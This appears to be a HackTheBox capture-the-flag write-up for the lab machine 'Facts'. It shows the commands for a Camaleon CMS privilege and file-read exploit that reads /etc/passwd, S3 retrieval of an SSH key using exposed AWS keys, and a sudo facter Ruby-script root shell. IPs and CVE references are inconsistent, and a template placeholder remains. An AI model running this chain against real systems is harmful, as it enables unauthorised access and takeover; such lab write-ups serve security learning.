layout: default
title: "HTB – Facts | Costabo1"
description: "HackTheBox writeup for the Facts machine by Costabo1"
<style>
  /* ── Google Fonts ─────────────────────────────────────────── */
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&display=swap');

  /* ── Root palette ─────────────────────────────────────────── */
  :root {
    --bg:        #0d0f14;
    --surface:   #13161e;
    --border:    #1e2230;
    --accent:    #00ff9d;
    --accent2:   #00b8ff;
    --danger:    #ff4b4b;
    --warn:      #ffa94d;
    --muted:     #6b7280;
    --text:      #d1d5db;
    --heading:   #f9fafb;
    --mono:      'Share Tech Mono', monospace;
    --sans:      'Syne', sans-serif;
  }

  /* ── Page base ────────────────────────────────────────────── */
  body {
    background: var(--bg);
    color: var(--text);
    font-family: var(--sans);
    line-height: 1.75;
    margin: 0;
  }

  /* ── Hero banner ──────────────────────────────────────────── */
  .htb-hero {
    border-bottom: 1px solid var(--border);
    padding: 3.5rem 2rem 2.5rem;
    background:
      linear-gradient(135deg, #0d0f14 60%, #0a1a12 100%);
    position: relative;
    overflow: hidden;
  }
  .htb-hero::before {
    content: "";
    position: absolute;
    inset: 0;
    background:
      repeating-linear-gradient(
        0deg,
        transparent,
        transparent 39px,
        rgba(0,255,157,.04) 40px
      );
    pointer-events: none;
  }
  .htb-hero .badge-row {
    display: flex;
    flex-wrap: wrap;
    gap: .5rem;
    margin-bottom: 1.25rem;
  }
  .badge {
    font-family: var(--mono);
    font-size: .72rem;
    padding: .2rem .65rem;
    border-radius: 3px;
    border: 1px solid;
    letter-spacing: .04em;
    text-transform: uppercase;
  }
  .badge-easy   { color: var(--accent);  border-color: var(--accent);  background: rgba(0,255,157,.06); }
  .badge-linux  { color: var(--accent2); border-color: var(--accent2); background: rgba(0,184,255,.06); }
  .badge-active { color: var(--warn);    border-color: var(--warn);    background: rgba(255,169,77,.06); }
  .badge-retired{ color: var(--muted);   border-color: var(--muted);   background: rgba(107,114,128,.06); }

  .htb-hero h1 {
    font-family: var(--sans);
    font-weight: 800;
    font-size: clamp(2rem, 5vw, 3.2rem);
    color: var(--heading);
    margin: 0 0 .5rem;
    letter-spacing: -.02em;
  }
  .htb-hero h1 span { color: var(--accent); }
  .htb-hero .subtitle {
    font-family: var(--mono);
    color: var(--muted);
    font-size: .85rem;
    margin: 0;
  }

  /* ── Info card grid ───────────────────────────────────────── */
  .info-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
    gap: 1px;
    background: var(--border);
    border: 1px solid var(--border);
    border-radius: 6px;
    overflow: hidden;
    margin: 2rem 0;
    font-family: var(--mono);
    font-size: .82rem;
  }
  .info-grid .cell {
    background: var(--surface);
    padding: .9rem 1.1rem;
  }
  .info-grid .cell .label {
    color: var(--muted);
    font-size: .7rem;
    text-transform: uppercase;
    letter-spacing: .08em;
    margin-bottom: .25rem;
  }
  .info-grid .cell .value { color: var(--heading); }

  /* ── Section headings ─────────────────────────────────────── */
  h2 {
    font-family: var(--sans);
    font-weight: 700;
    font-size: 1.3rem;
    color: var(--heading);
    margin: 2.5rem 0 1rem;
    padding-bottom: .4rem;
    border-bottom: 1px solid var(--border);
    display: flex;
    align-items: center;
    gap: .5rem;
  }
  h2 .icon {
    font-size: 1rem;
    opacity: .8;
  }
  h3 {
    font-family: var(--sans);
    font-weight: 700;
    color: var(--accent);
    font-size: 1rem;
    margin: 1.75rem 0 .5rem;
    font-family: var(--mono);
    letter-spacing: .02em;
  }

  /* ── Code / command blocks ────────────────────────────────── */
  pre, code {
    font-family: var(--mono);
  }
  pre {
    background: #0a0c11;
    border: 1px solid var(--border);
    border-left: 3px solid var(--accent);
    border-radius: 4px;
    padding: 1.1rem 1.25rem;
    overflow-x: auto;
    font-size: .83rem;
    color: #a8ffcb;
    margin: 1rem 0;
  }
  code {
    background: rgba(0,255,157,.07);
    color: var(--accent);
    padding: .1em .4em;
    border-radius: 3px;
    font-size: .88em;
  }
  pre code {
    background: none;
    color: inherit;
    padding: 0;
    font-size: inherit;
  }

  /* ── Callout / note boxes ─────────────────────────────────── */
  .callout {
    border: 1px solid;
    border-radius: 5px;
    padding: .85rem 1.1rem;
    margin: 1.25rem 0;
    font-size: .9rem;
    display: flex;
    gap: .75rem;
  }
  .callout-icon { flex-shrink: 0; font-size: 1.1rem; }
  .callout-body { flex: 1; }
  .callout-body strong { display: block; margin-bottom: .2rem; font-size: .8rem; text-transform: uppercase; letter-spacing: .06em; }
  .callout.info   { border-color: rgba(0,184,255,.3);  background: rgba(0,184,255,.05);  color: #93c5fd; }
  .callout.warn   { border-color: rgba(255,169,77,.3); background: rgba(255,169,77,.05); color: #fcd34d; }
  .callout.danger { border-color: rgba(255,75,75,.3);  background: rgba(255,75,75,.05);  color: #fca5a5; }
  .callout.win    { border-color: rgba(0,255,157,.3);  background: rgba(0,255,157,.05);  color: var(--accent); }

  /* ── Step list ────────────────────────────────────────────── */
  .steps { counter-reset: step; list-style: none; padding: 0; margin: 1rem 0; }
  .steps li {
    counter-increment: step;
    position: relative;
    padding: .75rem 1rem .75rem 3.2rem;
    margin-bottom: .5rem;
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 5px;
  }
  .steps li::before {
    content: counter(step, decimal-leading-zero);
    position: absolute;
    left: .9rem;
    top: 50%;
    transform: translateY(-50%);
    font-family: var(--mono);
    font-size: .75rem;
    color: var(--accent);
    letter-spacing: .02em;
  }

  /* ── Flag reveal ──────────────────────────────────────────── */
  .flag-block {
    display: flex;
    align-items: center;
    gap: 1rem;
    background: rgba(0,255,157,.04);
    border: 1px solid rgba(0,255,157,.25);
    border-radius: 6px;
    padding: 1rem 1.25rem;
    margin: 1.5rem 0;
    font-family: var(--mono);
  }
  .flag-block .flag-label {
    font-size: .72rem;
    color: var(--muted);
    text-transform: uppercase;
    letter-spacing: .1em;
    white-space: nowrap;
  }
  .flag-block .flag-value {
    color: var(--accent);
    font-size: .88rem;
    word-break: break-all;
    flex: 1;
  }
  .flag-block .flag-icon { font-size: 1.4rem; }

  /* ── Tool pill list ───────────────────────────────────────── */
  .tool-list {
    display: flex;
    flex-wrap: wrap;
    gap: .4rem;
    margin: .75rem 0 1.5rem;
    padding: 0;
    list-style: none;
  }
  .tool-list li {
    font-family: var(--mono);
    font-size: .75rem;
    padding: .25rem .7rem;
    background: var(--surface);
    border: 1px solid var(--border);
    border-radius: 3px;
    color: var(--accent2);
    letter-spacing: .03em;
  }

  /* ── Difficulty bar ───────────────────────────────────────── */
  .diff-bar { margin: .5rem 0 1.5rem; }
  .diff-bar .track {
    height: 5px;
    background: var(--border);
    border-radius: 99px;
    overflow: hidden;
    width: 200px;
  }
  .diff-bar .fill {
    height: 100%;
    border-radius: 99px;
    background: linear-gradient(90deg, var(--accent), var(--accent2));
  }
  .diff-bar .label {
    font-family: var(--mono);
    font-size: .72rem;
    color: var(--muted);
    margin-top: .35rem;
  }

  /* ── General prose ────────────────────────────────────────── */
  p { margin: .75rem 0; }
  a { color: var(--accent2); text-decoration: none; }
  a:hover { text-decoration: underline; }
  hr { border: none; border-top: 1px solid var(--border); margin: 2.5rem 0; }
  .content-wrap { max-width: 860px; margin: 0 auto; padding: 0 1.5rem 4rem; }

  /* ── Footer ───────────────────────────────────────────────── */
  .writeup-footer {
    border-top: 1px solid var(--border);
    padding: 1.5rem 2rem;
    font-family: var(--mono);
    font-size: .75rem;
    color: var(--muted);
    text-align: center;
    margin-top: 3rem;
  }
  .writeup-footer span { color: var(--accent); }
</style>
<!-- ══════════════════════════════════════════════════
     HERO
══════════════════════════════════════════════════ -->
<div class="htb-hero">
  <div class="content-wrap">
    <div class="badge-row">
      <span class="badge badge-easy">Easy</span>
      <span class="badge badge-linux">Linux</span>
      <span class="badge badge-retired">Retired</span>
    </div>
    <h1>🧠 HackTheBox — <span>Facts</span></h1>
    <p class="subtitle">costabo1 &nbsp;·&nbsp; writeup &nbsp;·&nbsp; 2025</p>
  </div>
</div>
<div class="content-wrap">
<!-- ── Machine info card ──────────────────────────── -->
<div class="info-grid">
  <div class="cell"><div class="label">OS</div><div class="value">Linux</div></div>
  <div class="cell"><div class="label">Difficulty</div><div class="value">Easy</div></div>
  <div class="cell"><div class="label">Points</div><div class="value">20</div></div>
  <div class="cell"><div class="label">Release</div><div class="value">TBD</div></div>
  <div class="cell"><div class="label">Status</div><div class="value">Retired</div></div>
  <div class="cell"><div class="label">Author</div><div class="value">Costabo1</div></div>
</div>

The objective of this machine is to gain initial access through a vulnerable web application, escalate privileges via cloud misconfiguration (AWS S3), and ultimately achieve root access through a Linux privilege escalation vector.

<span class="icon">🔭</span> Overview

Facts is an easy-difficulty machine demonstrating a full attack chain:

- Web exploitation (Camaleon CMS 2.9.0)
- Cloud misconfiguration (AWS S3)
- Credential exposure (SSH key leakage)
- Privilege escalation (sudo facter abuse)

Initial access is achieved via an exposed `/admin/register` endpoint allowing user creation, followed by exploitation of a CMS vulnerability to gain administrative access.

Post-exploitation reveals AWS credentials, which lead to an exposed S3 bucket containing an SSH private key. The key is cracked and used for SSH access.

Privilege escalation is achieved by abusing a misconfigured `sudo` rule involving the `facter` binary.

<!-- Difficulty visual -->
<div class="diff-bar">
  <div class="track"><div class="fill" style="width:30%"></div></div>
  <div class="label">Difficulty feel: Easy</div>
</div>
<span class="icon">🛠️</span> Tools Used
<ul class="tool-list">
  <li>nmap</li>
  <li>gobuster</li>
  <li>curl</li>
  <li>burpsuite</li>
  <li>netcat</li>
 
  <!-- Add or remove tools as needed -->
</ul>

<span class="icon">🔍</span> Enumeration
Port Scan
```bash
nmap -sC -sV -oN facts.nmap 10.10.35.249
```
# Paste your nmap output here
Nmap scan report for 10.129.35.249
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Subdirectories enumeration
```bash
gobuster dir -u http://10.129.35.24 -w /usr/share/wordlists/dirb/common.txt
```

Discovered endpoints:

 /admin/login
 /admin/register
In /admin/register, I was able to create an new user and login.

A user account was created:

* **Username:** `mew1222`
* **Password:** `mew121212`
I noticed the web app is running Camaleon CMS 2.9.0 and after some research.The application was vulnerable to CVE-2025-2304 
I can ultize it to gain admin privelege from my new register user.


☁️ AWS S3 Exploitation

In the admin pannel, you can use there is AWS S3 keys

### 🔐 Retrieved Credentials

* **Access Key:** `AKIAD337D13639BD95BE`
* **Secret Key:** `v9WTmIuNeeq4L5s72WobV6CQs6HIJVkrq7NdRpZb`
* **Region:** `us-east-1`
* **Buckets:** `http://facts.htb:54321`

Runing the aws cli command discovered two directorties, and internal contains an ssh id key
```bash
aws --endpoint-url http://facts.htb:54321 s3 ls      
```
internal
randomfacts
```bash
 aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .   
```
<div class="callout warn">
  <span class="callout-icon">⚠️</span>
  <div class="callout-body">
    <strong>Pitfall</strong>
    Note any common mistakes or things that tripped you up — this is useful for readers hitting the same wall.
  </div>

CVE-2024-46987 - Camaleon CMS Authenticated Arbitrary File Read</h1></body></html>


```bash
python adminpan.py -u http://facts.htb -l mew1222 -p mew121212 /etc/passwd           
```

Running this python payload from CVE-2024-46987 with the user account that have admin previlege reveal the backend web server's users

ss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false

With ssh John to crack the id_ed25519 password, it revealed the password is d******z
And the id_ed25519 is belongs to the userL trivia

```bash
sh -i id_ed25519 trivia@facts.htb
```

trivia@facts:~$ pwd  
/home/trivia

The user's flag was in william's directory
trivia@facts:~$ cat /home/william/flag.txt
cat: /home/william/flag.txt: No such file or directory
trivia@facts:~$ cat /home/william/user.txt


User Flag
<div class="flag-block">
  <span class="flag-icon">🏴</span>
  <span class="flag-label">user.txt</span>
  <span class="flag-value">flag:f36************* 🙂</span>
</div>







<span class="icon">📈</span> Privilege Escalation
Enumeration on Host
```bash
sudo -l
```
Sudo permission discovered:

```bash
sudo /usr/bin/facter --custom-dir /tmp
```

### Vulnerability

* `facter` loads Ruby scripts from a user-writable directory
* This allows arbitrary code execution as root
```bash
echo 'exec("/bin/sh")' > /tmp/x.rb
```
trivia@facts:/tmp$ cat x.rb
exec("/bin/sh")

Then I run the ruby's script with /usr/bin/facter
```bash
sudo /usr/bin/facter --custom-dir /tmp
```

We obtained the root's shell 
# whoami
root
# cd /root
# ls
minio-binaries	ministack  root.txt  snap


 


## 💥 Privilege Escalation Flow

<div class="mermaid">
flowchart TD
    A[User: trivia] --> B[sudo facter --custom-dir /tmp]
    B --> C[Writable /tmp directory]
    C --> D[Drop malicious Ruby script]
    D --> E[facter executes script]
    E --> F[exec '/bin/sh']
    F --> G[Root Shell]
</div>

<span class="icon">🚩</span> Flags


Root Flag
<div class="flag-block">
  <span class="flag-icon">🏁</span>
  <span class="flag-label">root.txt</span>
  <span class="flag-value">flag:eda2a********** 🙂</span>


Both flags captured. Machine complete.


<span class="icon">📝</span> Key Takeaways

* Mass assignment vulnerabilities can directly lead to privilege escalation
* File read vulnerabilities often expose cloud credentials
* S3 misconfigurations remain a critical real-world risk
* Writable plugin/script directories in sudo contexts are extremely dangerous
* Full compromise was achieved through chaining multiple small flaws


<span class="icon">🔗</span> Final thoughts


This machine demonstrates a realistic enterprise attack chain:

* Web application misconfiguration
* Cloud credential leakage
* Object storage abuse
* Linux privilege escalation via unsafe sudo tooling

Each vulnerability alone was minor, but combined they resulted in full system compromise.

HTB – Facts machine page
OWASP – Relevant vuln class
OffSec / other reference

</div><!-- /content-wrap -->
<div class="writeup-footer">
  <span>costabo1</span> &nbsp;·&nbsp; HackTheBox Writeup &nbsp;·&nbsp; All content for educational purposes only
</div>
